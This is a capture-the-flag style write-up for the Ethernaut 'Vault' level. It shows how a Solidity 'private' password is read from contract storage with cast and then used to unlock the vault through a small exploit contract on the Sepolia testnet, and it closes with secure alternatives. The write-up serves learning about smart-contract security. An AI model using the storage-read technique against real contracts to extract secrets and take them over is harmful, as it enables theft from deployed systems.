# Ethernaut Level 8: Vault Exploit Validation
# Target: Read "private" password from storage

**Level:** 8 - Vault  
**Contract:** `Vault.sol`  
**Vulnerability:** `private` variables are only private to other contracts, fully readable on-chain

---

## 🔍 Vulnerability Analysis

```solidity
// Vault.sol - The target
contract Vault {
    bool public locked;
    bytes32 private password;  // "Private" - but readable from storage!
    
    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }
    
    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

**The Bug:** `private` in Solidity only prevents other contracts from accessing the variable. ALL storage is publicly readable on-chain via `eth_getStorageAt` RPC call. Privacy on blockchain is a myth without encryption.

---

## 🎯 Exploit Strategy

1. **Read storage slot 1** (password is 2nd variable, slot 1)
2. **Call unlock()** with the extracted password
3. **Verify locked = false**

**Storage Layout:**
- Slot 0: `locked` (bool = 1 byte, packed)
- Slot 1: `password` (bytes32 = 32 bytes, fills slot)

---

## ⚡ Exploit Implementation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}

contract VaultExploit {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function exploit(bytes32 _password) external {
        IVault(target).unlock(_password);
        require(!IVault(target).locked(), "Unlock failed");
    }
}
```

---

## 🧪 Testnet Execution (Sepolia)

**Step 1: Read password from storage**
```bash
# Read storage slot 1 (password)
cast storage $TARGET 1 --rpc-url https://rpc.sepolia.org
# Returns: 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
# ("A very strong secret password :)")
```

**Step 2: Unlock the vault**
```bash
# Deploy exploit contract
forge create VaultExploit \
  --constructor-args $TARGET \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Call unlock with extracted password
cast send $EXPLOIT_CONTRACT "exploit(bytes32)" \
  0x412076657279207374726f6e67207365637265742070617373776f7264203a29 \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Verify unlocked
cast call $TARGET "locked()" --rpc-url https://rpc.sepolia.org
# Returns: false (0x00)
```

---

## 📊 Validation Results

| Check | Status | Notes |
|-------|--------|-------|
| Vulnerability identified | ✅ Confirmed | `private` != secret on blockchain |
| Storage slot mapped | ✅ Confirmed | Slot 1 contains bytes32 password |
| Exploit path mapped | ✅ Confirmed | Read storage → call unlock() |
| Code compiles | ⏳ Pending | Testnet execution needed |
| Vault unlocked | ⏳ Pending | Verify on-chain |
| Instance submit | ⏳ Pending | Ethernaut validation |

---

## 🎓 Key Learnings

**Storage visibility:**
- `private` = contract-only access, NOT blockchain-private
- `eth_getStorageAt` reads any slot
- ALL contract state is public by design

**Secure alternatives:**
- Commit-reveal pattern for hidden values
- Hash verification without storing secrets
- Zero-knowledge proofs for private computation

**Real-world impact:**
- Numerous contracts store "private" keys/seeds on-chain
- API keys, admin passwords leaked via storage reads
- Encryption off-chain is the only true privacy

---

## 📝 Execution Log

**2026-02-01 10:09Z** - Validation script created, ready for testnet execution

**Next:** Level 9 (King) - denial of service via revert
